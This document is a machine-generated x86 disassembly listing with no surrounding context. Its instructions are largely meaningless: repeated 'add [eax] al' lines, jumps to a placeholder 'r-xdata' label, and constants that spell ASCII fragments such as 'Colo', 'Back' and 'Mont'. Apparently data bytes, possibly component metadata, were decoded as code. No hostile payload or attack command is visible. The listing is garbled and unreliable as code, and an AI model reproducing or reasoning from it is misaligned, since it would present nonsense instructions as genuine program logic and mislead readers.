outsb
dec esp
imul ebp [ esi + 0x6b ] 0xcb4c08b
inc ebx
add [ eax ] al
add [ eax ] al
adc al 0x1a
inc edx
add al dh
jle r-xdata
jae r-xdata
add [ eax ] al
add [ eax + edx + 0x40040 ] dl
add [ eax ] al
nop
sub [ ebx ] cl
inc ebx
add [ ebx ] al
adc [ esp + edx * 2 + 0x6f ] dl
aam 0xb
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
aas
inc esp
add [ eax - 0x5bffbfcb ] bl
xor eax 0x35a80040
insb
add [ gs : eax ] eax
add [ eax ] al
add [ eax + eax ] al
add [ eax ] al
and al 0xb
inc ebx
add [ ecx ] cl
je r-xdata
inc eax
test al 0x35
imul esi [ esi + 0x69 ] 0x8726564
add [ eax ] al
and al 0x0
jae r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
jne r-xdata
xor eax [ eax ]
sbb al 0x33
inc eax
inc eax
add [ eax + 0x4035 ] ah
je r-xdata
add [ ebp + esi + 0x35a00040 ] ch
inc eax
add [ eax ] al
outsb
or [ edx + 0x73 ] dh
inc ebx
push 0xb6b6365
je r-xdata
jae r-xdata
jb r-xdata
sub_43173a
inc esp
add [ edi + esi * 8 ] dh
inc esp
add [ eax - 0x34 ] al
inc edx
add [ eax + 0x800438b ] dh
mov [ ebx ] es
cmp [ edx - 0x65f3ffbd ] bl
inc ebx
add [ ebx + ecx * 4 ] bl
inc ebx
add [ esi ] cl
add [ eax ] al
add [ eax ] al
add [ ebx ] al
add [ eax ] al
add [ eax + edx + 0x21c0040 ] dl
add [ eax ] al
xchg esp eax
adc [ eax ] al
loopne r-xdata
xchg esp eax
adc [ eax ] al
in al 0x2
add [ eax ] al
and [ eax ] al
adc eax 0x87001402
add [ 0xe00 ] cl
add [ ebp ] edx
or al 0x0
add eax 0x12010600
add [ edi ] eax
inc esi
add [ 0x6b036b0 ] cl
mov al 0xc
mov al 0xe
mov al 0x9
mov al 0x2
mov ebp 0xb035bd04
add [ esi + ecx * 2 ] dl
mov esp 0xffecffb3
mov dl 0xff
mov cl 0xff
std
push [ eax - 0x50004901 ]
[ eax + 0x6c ]
add [ eax ] al
sub_4317be
inc ebx
add [ eax - 0x37ffbc8f ] dh
jno r-xdata
inc ebx
add ah bl
jno r-xdata
add [ edx + esi * 2 + 0x43 ] al
inc eax
add [ eax + ebx + 0x43 ] cl
add [ eax + 0x7d ] bh
inc ebx
add [ eax ] cl
jb r-xdata
inc ebx
add [ ecx + esi * 2 - 0x6e07ffbd ] ch
inc ebx
add [ eax ] ch
xchg esi eax
inc ebx
add [ ebp + ebp * 2 + 0x43 ] al
add [ eax + 0x72 ] ch
inc ebx
add [ edx + esi * 2 - 0x6a87ffbd ] bl
inc ebx
add ah al
jb r-xdata
mov esp 0x6c004450
push ss
inc ebx
add al bl
leave
inc edx
add [ ecx ] dl
or [ ebx + 0x6f ] al
insd
inc ebx
je r-xdata
inc ebx
add [ ebp + edi * 2 + 0x7dc80043 ] cl
inc ebx
add ah bh
xchg esi eax
add [ eax ] ah
jb r-xdata
add [ esp + ebp * 2 + 0x72440043 ] dl
inc ebx
add [ esi + edx * 4 - 0x75a7ffbd ] al
inc ebx
add [ eax + 0x24004373 ] ch
jge r-xdata
add [ eax ] al
add [ eax - 0x80000000 ] al
adc [ eax ] eax
pop es
inc ebx
jb r-xdata
clc
inc esp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
push cs
add [ ebx ] cl
inc edx
outsd
jb r-xdata
insb
jae r-xdata
inc ebx
add [ eax - 0x69 ] cl
inc ebx
add [ eax ] cl
push esp
push esp
outsd
outsd
insb
add [ esp + edi * 2 ] dl
inc ebx
add [ esp + edi * 2 + 0x43 ] bh
add [ eax ] cl
jge r-xdata
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
adc eax 0x75430c00
jae r-xdata
imul ebp [ edi + 0x6e ] r-xdata
jo r-xdata
popad
jo r-xdata
inc esp
add ah ah
pop [ eax + eax - 0x38 ]
scasd [ edi ]
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x43070011 ] al
imul esp [ esp + esi * 2 + 0x68 ] r-xdata
adc al 0x2
add bh bh
in al 0x5b
inc ebx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
adc [ esi ] 0x0
add [ eax ] al
str [ edx + eax * 2 ]
jne r-xdata
pop esp
add [ eax ] al
[ eax + eax ]
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
or eax 0x75410800
je r-xdata
add [ eax ] dl
cmp eax [ eax + eax + 0x5b ]
add [ eax ] al
jmp [ eax + 0x1004484 ]
inc edx
popad
jb r-xdata
add al bh
xchg edi eax
inc ebx
add [ eax ] bh
jge r-xdata
jne r-xdata
outsd
insd
imul edi [ edx + 0x61 ] 0xcc656c62
pop esi
inc ebp
add [ eax ] bh
add al [ eax ]
[ eax + 0x1004369 ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x440e0016 ] al
add bh bh
push esp
xchg ecx eax
inc esp
add [ eax - 0x6f ] dh
add [ eax + eax ] dh
jmp [ eax + 0x10044b4 ]
je r-xdata
je r-xdata
add [ eax ] eax
call esp
push ebx
imul edi [ edx + 0x65 ] r-xdata
insb
add [ edi ] al
or [ esp + edx * 2 + 0x6f ] dl
outsd
insb
inc edx
popad
jb r-xdata
inc ebx
add [ ebp + edi * 2 + 0x43 ] dl
add [ esp + edi * 2 + 0x43 ] al
add [ ecx ] cl
add al [ eax ]
[ eax ]
int3
jae r-xdata
adc [ eax ] al
test al 0x1
add bh bh
nop
jecxz r-xdata
inc esp
add [ eax ] al
add [ eax ] al
add [ 0x12ff0000 ] 0x0
add eax 0x6f6c6f43
jb r-xdata
xchg ecx eax
inc edx
inc esp
in al dx
outsb
dec eax
imul esp [ gs : edi + 0x68 ] 0x40103c74
add [ eax ] dl
add al [ eax ]
call [ esp + ebx * 2 ]
inc ebx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
adc [ edi ] 0x0
add [ eax ] al
adc [ eax ] al
or eax [ edx + 0x75 ]
je r-xdata
adc [ eax ] al
movsd [ edi ] [ esi ]
outsb
push edi
imul esp [ esp + esi * 2 + 0x68 ] r-xdata
mov ah 0x8f
inc edx
jb r-xdata
[ ebx + 0x1ff0000 ]
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
pop ss
add [ eax ] cl
inc esp
outsd
arpl [ ebx + 0x53 ] bp
imul esi [ ebp - 0x8 ] 0x7a00443a
add [ eax ] eax
push esp
clc
inc esp
add [ eax ] bl
stc
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x43050014 ] al
je r-xdata
outsd
add [ eax ] al
or [ edi + ebp * 2 + 0x63 ] al
imul edx [ ebx + 0x69 ] 0x74
clc
cmp al [ eax + eax + 0x7a ]
xor eax [ eax + eax + 0x10 ]
inc eax
add [ 0x44ff0002 ] ah
cwde
inc ebx
imul esi [ ebx + 0x61 ] 0x64656c62
dec ecx
insd
popad
jae r-xdata
add bh bh
cwde
imul eax [ ebx ] 0x1
add [ eax ] al
add [ eax - 0x80000000 ] al
push ss
add [ esi ] cl
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
sbb [ eax ] eax
or [ edx + esi * 2 + 0x61 ] al
dec ebx
imul ebp [ esi + 0x64 ] r-xdata
pop ebp
add [ eax ] al
jmp [ eax ]
inc ecx
inc esp
add [ ebx - 0x64010000 ] bl
add [ eax ] al
inc [ ecx ]
sub_431e6d
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f070034 ] al
outsb
inc ebx
insb
imul esp [ ebx + 0x6b ] r-xdata
xor [ ecx ] al
add bh bh
xor [ ecx ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
xor eax 0x6e4f0e00
inc ebx
outsd
outsb
je r-xdata
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
cmp [ eax ] al
adc [ edi + 0x6e ] cl
js r-xdata
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
cmp eax [ eax ]
or al 0x4f
je r-xdata
inc ebx
jne r-xdata
dec edi
push eax
outsd
jo r-xdata
add [ edi + ecx * 2 ] dl
je r-xdata
outsb
inc ebx
jne r-xdata
mov al [ 0x1ff0002 ]
insd
imul edi [ edx + 0x65 ] 0x65646441
xor [ fs : 0x2900043 ] dl
add bh bh
jo r-xdata
add [ eax ] al
add [ eax + 0x4f0a0041 ] al
je r-xdata
outsb
inc ebx
jne r-xdata
add [ eax + 0x4f14003e ] al
insd
imul edi [ edx + 0x65 ] 0x4315e864
add [ eax - 0x5700fffe ] ch
add al [ eax ]
inc [ ecx ]
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
cmp al 0x0
adc [ edi + 0x6e ] ecx
je r-xdata
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0c0036 ] al
adc eax [ ebx ]
js r-xdata
jb r-xdata
jo r-xdata
outsb
inc esp
add [ eax - 0x80000000 ] al
inc ecx
add [ edx ] cl
dec edi
insd
imul edi [ edx + 0x65 ] 0x4277654e
jne r-xdata
add [ eax ] al
add [ eax - 0x80000000 ] al
aas
add [ eax ] dl
dec edi
je r-xdata
add [ eax ] eax
insd
imul edi [ edx + 0x65 ] 0x496e6143
outsb
jae r-xdata
add [ eax + 0x4f140039 ] al
add [ eax ] al
je r-xdata
js r-xdata
add bh bh
add [ ecx ] cl
dec edi
outsb
inc ebp
outsb
inc esp
jb r-xdata
inc esi
inc esp
add [ eax ] cl
add [ eax ] eax
dec [ eax ]
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f090045 ] al
outsb
inc edi
inc esp
jb r-xdata
inc esp
je r-xdata
outsd
arpl [ ebx + 0x4f ] bp
jbe r-xdata
je r-xdata
add [ eax ] al
insd
imul edi [ edx + 0x65 ] 0x656c6544
je r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f11003c ] al
outsb
jb r-xdata
outsb
inc ebx
jne r-xdata
add [ eax - 0x80000000 ] al
cmp [ eax ] eax
insd
inc esp
jb r-xdata
outsb
inc ebx
jne r-xdata
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
add [ ss : edi + ecx * 2 ] cl
add bh bh
inc edi
je r-xdata
inc esp
pop edx
inc ecx
add al al
add [ eax ] eax
inc eax
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f070047 ] al
outsb
inc ebp
outsb
je r-xdata
inc ebp
outsb
inc esp
outsd
arpl [ ebx + 0x3c ] bp
inc esi
inc esp
add [ eax ] bl
add [ eax ] eax
[ eax ]
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f090046 ] al
or [ edi + 0x6e ] ecx
jb r-xdata
outsd
arpl [ ebx + 0x44 ] bp
outsb
inc ebx
jne r-xdata
outsb
inc esp
pop edx
inc ecx
add al al
add al [ eax ]
inc eax
add al [ eax ]
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f10003f ] al
outsb
inc esp
insd
imul edi [ edx + 0x65 ] 0x65736552
je r-xdata
inc esp
pop edx
inc ecx
add [ eax - 0x4700fffe ] bh
add al [ eax ]
inc [ ecx ]
add [ eax ] al
jne r-xdata
xor [ 0x2880043 ] dl
add bh bh
mov [ edx ] al
nop
add al [ eax ]
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
ja r-xdata
test al 0x43
inc esp
add al ah
add [ eax ] al
jmp eax
imul esi [ ebp + 0x49 ] 0xa86f666e
inc ebx
outsb
dec ebp
outsd
jne r-xdata
dec edi
jb r-xdata
sub [ ecx ] al
add bh bh
sub [ ecx ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
inc eax
add [ edx ] cl
dec edi
inc ebp
inc esp
add al ch
add [ eax ] al
add [ eax - 0x4700ffff ] bh
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0a0042 ] al
imul eax [ edx + esi * 2 + 0x6f ] 0x70
add [ edi + 0x44 ] al
pop edx
inc ecx
add [ eax ] ch
add [ eax ] eax
[ eax ]
outsb
inc esp
bound ebp [ ebx + eax * 2 + 0x6c ]
imul esp [ ebx + 0x6b ] r-xdata
mov al 0x1
add bh bh
mov al 0x1
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0a0040 ] al
je r-xdata
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0d003d ] al
outsb
je r-xdata
adc al 0x4f
add [ eax ] al
cmp [ ecx ] 0x0
adc eax [ ebx ]
add [ edx ] 0x0
inc [ eax + 0x1ff0002 ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f120037 ] al
outsb
inc ebx
jne r-xdata
inc edi
inc esp
add [ eax ] al
add [ eax ] eax
inc [ eax ]
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0b004e ] al
outsb
push ebx
inc esp
outsd
ja r-xdata
inc esp
add al dl
add [ eax ] al
call eax
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0b004a ] al
dec ecx
outsb
outsw
test al 0x43
pop edx
inc ecx
add al cl
add [ eax ] eax
dec eax
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f060048 ] al
outsb
inc ebp
js r-xdata
add [ eax ] al
insd
imul edi [ edx + 0x69 ] 0x158c676e
inc ebx
add [ eax - 0x6700fffe ] bl
add al [ eax ]
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
insd
imul edi [ edx + 0x65 ] 0x446e6143
insb
je r-xdata
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
cmp al [ eax ]
je r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
sbb [ ebx ] ah
inc ebx
add [ eax + eax ] cl
jb r-xdata
and [ esp + eax * 2 ] al
fadd [ eax ]
add bh bh
fadd [ eax ]
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
dec ebx
add [ ebx ] cl
dec edi
outsb
dec ebp
outsd
jne r-xdata
or ecx [ edi + 0x6e ]
je r-xdata
inc ebx
jne r-xdata
add [ eax - 0x80000000 ] al
cmp eax 0x6e4f0d00
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0c003b ] al
inc esp
pop edx
inc ecx
add [ eax - 0x5f00fffe ] ah
add al [ eax ]
inc [ ecx ]
add bh bh
insd
inc esp
jb r-xdata
add [ eax ] al
add ah cl
jae r-xdata
inc esp
outsd
arpl [ ebx - 0xc ] bp
inc ebp
inc esp
add [ eax ] dl
add [ eax ] eax
call [ eax ]
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0b004f ] al
outsb
push ebx
je r-xdata
dec ebp
outsd
jbe r-xdata
dec eax
inc esp
add al dl
add [ eax ] eax
call eax
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0d0049 ] al
outsb
ja r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebx + 0x43 ] bl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
mov [ ebx ] ah
inc ebx
add [ eax ] ah
add [ eax ] al
add al bl
pushad
inc ecx
add [ eax - 0x5bffbfcb ] bl
xor eax 0x35a80040
inc eax
add [ ebp + esi + 0x35a00040 ] ch
add [ eax - 0x5bffbfcb ] bl
xor eax 0x35a80040
inc eax
add [ ebp + esi + 0x35a00040 ] ch
inc eax
add [ eax ] al
jb r-xdata
je r-xdata
jne r-xdata
add [ eax ] al
add [ eax ] cl
add [ eax ] al
inc [ ecx ]
add [ ecx ] cl
push esp
js r-xdata
inc ebx
popad
insb
inc ebx
outsd
insb
outsd
jb r-xdata
inc eax
add [ eax ] al
xor eax [ eax ]
sbb al 0x33
inc eax
add [ eax - 0x67ffbe72 ] cl
pop [ ecx ]
mov al [ 0xffffffffe800418f ]
jb r-xdata
add [ eax * 2 + 0x6d6d6f43 ] dl
outsd
outsb
inc ebx
popad
insb
outsb
popad
jb r-xdata
inc esp
jb r-xdata
adc al 0x4f
cmp [ edx ] 0x0
je r-xdata
outsb
je r-xdata
inc ebx
outsd
insb
outsd
jb r-xdata
daa
pushfd
and eax [ ebx ]
pop es
andps xmm1 [ ebp + 0x6f ]
outsb
je r-xdata
outsd
jb r-xdata
xor eax [ eax ]
sbb al 0x33
inc eax
add [ eax + 0x33 ] bl
inc eax
add [ eax + 0x4035 ] ah
add [ eax ] al
int3
nop
inc edi
inc esp
add al dh
add [ eax ] eax
push eax
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
outsb
inc ebx
jne r-xdata
add [ eax ] al
add [ eax + 0x4f14003a ] al
outsb
outsb
call 0xffffffffb0436218
add al [ eax ]
push [ eax + 0x1ff0002 ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f100038 ] al
jae r-xdata
inc edx
popad
arpl [ ebx + 0x43 ] bp
outsd
insb
outsd
jb r-xdata
push 0x436c6143
inc ebx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ 0xff0000 ] al
daa
inc edx
add [ eax + eax ] dl
add bh bh
hlt
inc edx
add [ eax ] dl
add [ eax ] al
push esp
pushfd
inc ebx
add [ ecx ] al
add [ eax ] al
add [ edx ] al
add [ eax ] al
add [ edx ] al
add [ eax ] al
inc [ edx ]
add [ esi ] cl
outsd
insb
outsd
jb r-xdata
inc ebx
popad
insb
inc ebx
add [ eax + 0x4f080050 ] al
outsb
push ebp
outsb
inc esp
outsd
arpl [ ebx - 0x75 ] bp
rcr [ eax ] 0x23
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] bl
and eax [ ebx ]
or al 0x0
add [ eax ] al
inc eax
add [ ebx + 0x43 ] bh
add [ eax ] al
add [ eax ] al
je r-xdata
popad
jns r-xdata
push esp
imul esi [ esp + ebp * 2 + 0x65 ] 0x6b636142
inc ebx
outsd
add al [ eax ]
daa
inc edx
add [ eax + eax ] bl
add bh bh
hlt
add bh bh
add al [ eax ]
push cs
jl r-xdata
fwait
inc ebx
add [ edi ] cl
push esp
dec ebp
outsd
outsb
je r-xdata
add [ eax - 0x17ffbe71 ] ah
daa
inc edx
add [ eax + eax ] cl
add bh bh
hlt
add [ eax ] al
add [ eax ] al
dec ecx
outsb
or esp [ edi + ebp * 2 + 0x77 ]
push esp
outsd
ja r-xdata
add [ ecx ] cl
inc edx
popad
arpl [ ebx + 0x43 ] bp
outsd
insb
outsd
jb r-xdata
add [ eax ] al
add [ eax ] al
add eax 0xff0000
inc ebx
add [ ecx + 0x41 ] cl
add [ esi ] al
add [ eax ] cl
inc ebx
outsd
insd
inc ebx
je r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al dl
inc ebx
add [ eax + 0x2 ] dl
add [ eax ] al
hlt
outsb
je r-xdata
or esp [ edi + ebp * 2 + 0x77 ]
push ebx
outsd
ja r-xdata
inc edi
je r-xdata
outsb
jae r-xdata
insb
outsd
jb r-xdata
insb
jae r-xdata
add ecx [ eax ]
push es
popad
jb r-xdata
jb r-xdata
adc [ eax ] al
jl r-xdata
outsd
outsb
push ebx
outsb
jb r-xdata
or [ esi ] al
popad
jns r-xdata
add [ eax ] al
push esp
pushfd
add [ eax + 0x8004227 ] bl
add [ 0x746e6f4d ] al
push 0x72614308
push esp
dec edi
bound ebp [ edx + 0x65 ]
hlt
imul ebp [ esi + 0x61 ] 0x1104006c
outsd
outsb
dec ebp
popad
jns r-xdata
jb r-xdata
popad
jns r-xdata
add [ eax ] al
add [ eax ] al
add ah ah
inc ebx
add [ ebp + 0x25ec0040 ] cl
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
inc eax
or [ edi + ebp * 2 + 0x77 ] esp
inc esi
outsd
ja r-xdata
add [ esi + ebx * 4 + 0x43 ] ah
add ah cl
add al [ ebp ]
jb r-xdata
inc edx
outsd
insb
dec ecx
outsb
outsw
or [ ebx + 0x61 ] al
add [ ebp + esi - 0x2cd3ffc0 ] ch
or [ ebx + 0x61 ] al
adc [ edi + ebp * 2 + 0x77 ] ah
dec esp
outsd
ja r-xdata
inc esp
add [ eax ] al
xor eax [ eax ]
sbb al 0x33
inc eax
lodsb [ esi ]
xor eax 0xd32c0040
imul ebp [ esi + 0x61 ] 0x4d0d016c
or [ edi + ebp * 2 + 0x77 ] esp
push ebx
outsd
ja r-xdata
outsw
inc ebp
jbe r-xdata
push 0x64737275
popad
jns r-xdata
add [ eax ] al
inc eax
add ah ch
and eax 0x43
add [ eax ] al
add [ eax ] al
add [ eax ] al
je r-xdata
inc ebx
popad
jne r-xdata
inc eax
add [ eax + edx + 0x40 ] bh
add [ eax + edx + 0x40 ] bh
outsb
popad
insb
add [ ecx + edx ] al
popad
jns r-xdata
arpl [ eax + eax + 0x5 ] si
dec ebp
outsd
outsb
je r-xdata
push 0x65
popad
je r-xdata
inc eax
inc ebx
outsd
insd
inc ebx
je r-xdata
or [ ebx + 0x6f ] al
outsd
ja r-xdata
add [ eax ] al
add [ eax ] al
in al 0x26
inc ebx
insb
jae r-xdata
imul ebp [ fs : esi + 0x61 ] 0x4d0d016c
outsd
arpl [ ecx + 0x6c ] sp
inc esp
popa
jne r-xdata
je r-xdata
and eax 0x14080043
push esp
dec edi
outsb
sub_4323ef
pushfd
inc ebx
add [ ecx ] al
add [ eax ] al
add [ ecx ] al
outsb
je r-xdata
inc ebx
outsd
insb
outsd
jb r-xdata
jae r-xdata
inc edx
popad
arpl [ ebx + 0x43 ] bp
outsd
insb
outsd
jb r-xdata
push 0x436c6143
daa
je r-xdata
popad
jns r-xdata
push esp
imul esi [ esp + ebp * 2 + 0x65 ] 0x6b636142
inc ebx
outsd
add al [ eax ]
daa
inc edx
add [ eax + eax ] bl
add bh bh
hlt
add bh bh
add al [ eax ]
push cs
jl r-xdata
inc ebx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ 0xff0000 ] al
daa
inc edx
add [ eax + eax ] dl
add bh bh
hlt
add [ eax ] al
add [ eax ] al
dec ecx
outsb
or esp [ edi + ebp * 2 + 0x77 ]
push esp
outsd
ja r-xdata
add [ ecx ] cl
inc edx
popad
arpl [ ebx + 0x43 ] bp
outsd
insb
outsd
jb r-xdata
add [ eax ] al
add [ eax ] al
add eax 0xff0000
inc ebx
add [ ecx + 0x41 ] cl
add [ esi ] al
add [ eax ] cl
inc ebx
outsd
insd
inc ebx
je r-xdata
add [ eax - 0x17ffbe71 ] ah
fwait
inc ebx
add [ edi ] cl
push esp
dec ebp
outsd
outsb
je r-xdata
daa
inc edx
add [ eax + eax ] cl
add bh bh
hlt
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al dl
inc ebx
add [ eax + 0x2 ] dl
add [ eax ] al
hlt
outsb
je r-xdata
or esp [ edi + ebp * 2 + 0x77 ]
push ebx
outsd
ja r-xdata
inc edi
je r-xdata
outsb
jae r-xdata
insb
outsd
jb r-xdata
insb
jae r-xdata
add [ eax ] al
add [ eax ] cl
add [ eax ] al
inc [ ecx ]
add [ ecx ] cl
push esp
js r-xdata
inc ebx
popad
insb
inc ebx
outsd
insb
outsd
jb r-xdata
add ecx [ eax ]
push es
popad
jb r-xdata
jb r-xdata
adc [ eax ] al
jl r-xdata
outsd
outsb
push ebx
outsb
jb r-xdata
or [ esi ] al
popad
jns r-xdata
add [ eax ] al
push esp
pushfd
add [ eax + 0x8004227 ] bl
pushfd
and eax [ ebx ]
pop es
andps xmm1 [ ebp + 0x6f ]
outsb
je r-xdata
add [ 0x746e6f4d ] al
push 0x72614308
push esp
dec edi
bound ebp [ edx + 0x65 ]
hlt
imul ebp [ esi + 0x61 ] 0x1104006c
outsd
outsb
dec ebp
popad
jns r-xdata
jb r-xdata
popad
jns r-xdata
add [ eax ] al
add [ eax ] al
add ah ah
inc ebx
add [ ebp + 0x25ec0040 ] cl
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
inc eax
or [ edi + ebp * 2 + 0x77 ] esp
inc esi
outsd
ja r-xdata
inc edx
add [ eax ] dl
add [ eax ] al
push esp
pushfd
inc ebx
add [ ecx ] al
add [ eax ] al
add [ edx ] al
add [ eax ] al
add [ edx ] al
add [ eax ] al
inc [ edx ]
add [ esi ] cl
outsd
insb
outsd
jb r-xdata
inc ebx
popad
insb
inc ebx
add [ esi + ebx * 4 + 0x43 ] ah
add ah cl
add al [ ebp ]
jb r-xdata
inc edx
outsd
insb
dec ecx
outsb
outsw
or [ ebx + 0x61 ] al
add [ ebp + esi - 0x2cd3ffc0 ] ch
or [ ebx + 0x61 ] al
adc [ edi + ebp * 2 + 0x77 ] ah
dec esp
outsd
ja r-xdata
inc esp
add [ eax ] al
xor eax [ eax ]
sbb al 0x33
inc eax
lodsb [ esi ]
xor eax 0xd32c0040
imul ebp [ esi + 0x61 ] 0x4d0d016c
or [ edi + ebp * 2 + 0x77 ] esp
push ebx
outsd
ja r-xdata
outsw
inc ebp
jbe r-xdata
push 0x64737275
popad
jns r-xdata
add [ eax ] al
inc eax
add ah ch
and eax 0x43
add [ eax ] al
add [ eax ] al
add [ eax ] al
je r-xdata
inc ebx
popad
jne r-xdata
inc eax
add [ eax + edx + 0x40 ] bh
add [ eax + edx + 0x40 ] bh
outsb
popad
insb
add [ ecx + edx ] al
popad
jns r-xdata
arpl [ eax + eax + 0x5 ] si
dec ebp
outsd
outsb
je r-xdata
push 0x65
popad
je r-xdata
inc eax
inc ebx
outsd
insd
inc ebx
je r-xdata
or [ ebx + 0x6f ] al
outsd
ja r-xdata
add [ eax ] al
add [ eax ] al
in al 0x26
inc ebx
insb
jae r-xdata
imul ebp [ fs : esi + 0x61 ] 0x4d0d016c
outsd
arpl [ ecx + 0x6c ] sp
inc esp
popa
jne r-xdata
je r-xdata
and eax 0x14080043
push esp
dec edi
outsb
sub_4324ba
push esp
inc ebx
popad
insb
inc esp
popad
jns r-xdata
popad
je r-xdata
push di
imul eax [ gs : ecx ] 0x0
add [ eax ] al
add [ edi ] al
add [ eax ] al
add [ esp + 0x64090043 ] dh
outsd
ja r-xdata
popad
jb r-xdata
dec esp
outsd
outsb
popad
jns r-xdata
hlt
imul ebp [ esi + 0x61 ] 0x1104006c
dec ebp
popad
jns r-xdata
add [ eax ] al
inc eax
add ah ch
and eax 0x43
add [ eax ] al
add [ eax ] al
add [ eax ] al
je r-xdata
or al 0x64
outsd
outsd
ja r-xdata
add [ esi + ebx * 4 + 0x43 ] ah
add ah cl
add al [ ebp ]
jb r-xdata
inc edx
outsd
insb
dec ecx
outsb
outsw
or [ ebx + 0x61 ] al
adc [ edi + ebp * 2 + 0x77 ] ah
outsd
ja r-xdata
inc eax
inc ebx
outsd
inc edi
je r-xdata
outsb
jae r-xdata
inc ebx
je r-xdata
jne r-xdata
inc ebx
popad
jne r-xdata
adc [ eax ] al
jl r-xdata
outsd
add [ eax ] al
add [ eax ] al
in al 0x26
inc ebx
insb
jae r-xdata
or [ esi ] al
popad
jns r-xdata
outsb
jae r-xdata
lodsb [ esi ]
xor eax 0xd32c0040
outsd
outsb
imul ebp [ esi + 0x61 ] 0x4d0d016c
inc eax
add [ eax + edx + 0x40 ] bh
add [ eax + edx + 0x40 ] bh
outsb
popad
insb
add [ ecx + edx ] al
popad
jns r-xdata
add [ eax ] al
add [ eax ] al
add ah ah
inc ebx
add [ ebp + 0x25ec0040 ] cl
inc ebx
add [ eax ] al
